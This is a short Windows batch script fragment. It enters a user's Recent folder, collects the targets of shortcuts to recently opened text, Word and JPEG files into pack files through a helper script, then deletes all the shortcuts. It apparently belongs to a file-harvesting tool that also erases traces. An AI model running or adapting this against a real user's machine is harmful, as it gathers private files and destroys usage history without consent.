:Start
set MB=
set MB=%*
cd %MB%\Recent
if errorlevel 1 goto End
set type=txt&set end=%setup%\TDPack.txt
FOR /F "delims=" %%i in ('dir /b *.txt.lnk') do call %setup%\Readlnk.bat %%i
set type=doc&set end=%setup%\TDPack.txt
FOR /F "delims=" %%i in ('dir /b *.doc.lnk') do call %setup%\Readlnk.bat %%i
set type=jpg&set end=%setup%\EJPack.txt
FOR /F "delims=" %%i in ('dir /b *.jpg.lnk') do call %setup%\Readlnk.bat %%i
del *.lnk
cd..&cd..
:End